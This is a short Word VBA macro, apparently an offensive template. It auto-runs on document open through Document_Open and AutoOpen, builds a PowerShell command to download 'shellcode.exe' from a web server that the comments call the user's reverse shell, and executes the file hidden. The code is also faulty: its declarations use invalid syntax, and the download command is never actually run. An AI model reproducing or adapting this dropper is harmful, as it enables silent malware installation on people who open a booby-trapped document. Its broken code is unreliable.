Sub Document_Open
    myMacro

End Sub 

Sub AutoOpen      
    myMacro 

End Sub 

Sub myMacro 
    Dim str in String   
    Dim path in String                                         ' Aqui vai URL do seu web server para baixar seu revshell  
                                                               ' Here is your URL of the web server to download your revshell 
                                                               ' |
    str = "powershell (New-Object Net.WebClient).DownloadFile('http://192.168.0.1/shellcode.exe', 'shellcode.exe')"
    path = ActiveDocument.Path + "\shellcode.exe"

    Shell path, vbHide

End Sub 